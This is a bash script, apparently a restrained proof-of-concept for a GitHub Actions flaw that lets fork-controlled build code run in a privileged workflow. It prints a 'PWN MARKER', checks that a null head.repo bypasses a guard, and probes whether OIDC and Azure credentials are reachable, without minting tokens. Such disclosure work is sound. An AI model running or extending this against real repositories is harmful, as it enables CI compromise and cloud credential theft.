#!/usr/bin/env bash
set -u
echo "=================================================================="
echo "  PWN MARKER — fork-controlled build script IS EXECUTING"
echo "=================================================================="
echo "event  : ${GITHUB_EVENT_NAME:-<unset>}"
echo "action : $(jq -r '.action // "<none>"' "$GITHUB_EVENT_PATH")"
echo "repo   : ${GITHUB_REPOSITORY:-<unset>}"
echo
echo "--- mắt xích quyết định ---"
jq -c '{head_repo: .pull_request.head.repo,
        head_repo_id: .pull_request.head.repo.id,
        head_label: .pull_request.head.label,
        head_sha: .pull_request.head.sha,
        base_repository_id: .repository.id}' "$GITHUB_EVENT_PATH"
if [ "$(jq -r '.pull_request.head.repo == null' "$GITHUB_EVENT_PATH")" = "true" ]; then
  echo "[+] head.repo == null -> fromPayload(...) === undefined -> guard early-return"
else
  echo "[-] head.repo vẫn là object -> lẽ ra phải throw, chuỗi chưa đúng"
fi
echo
echo "--- commit đang checkout (phải là commit của FORK) ---"
git log -1 --format='%H%n%an <%ae>%n%s' 2>/dev/null || echo "(không phải git repo)"
echo
echo "--- OIDC / secrets reachability (chỉ kiểm tra, KHÔNG mint token) ---"
echo "ACTIONS_ID_TOKEN_REQUEST_URL : ${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}${ACTIONS_ID_TOKEN_REQUEST_URL:-no}"
echo "AZURE_CLIENT_ID              : ${AZURE_CLIENT_ID:-<unset>}"
echo "AZURE_TENANT_ID              : ${AZURE_TENANT_ID:-<unset>}"
echo "=================================================================="
